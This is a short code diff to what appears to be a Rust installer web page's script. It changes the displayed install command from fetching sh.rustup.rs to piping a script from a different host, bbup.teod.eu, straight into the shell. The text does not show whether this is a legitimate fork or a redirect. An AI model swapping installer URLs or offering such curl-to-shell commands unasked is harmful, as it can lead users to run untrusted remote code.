@@ -2,7 +2,7 @@
 
 var platforms = ["default", "unknown", "unix"];
 var platform_override = null;
-var rustup_install_command = "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh";
+var rustup_install_command = "curl --proto '=https' --tlsv1.2 -sSf https://bbup.teod.eu/install.sh | sh";
 
 function detect_platform() {
     "use strict";
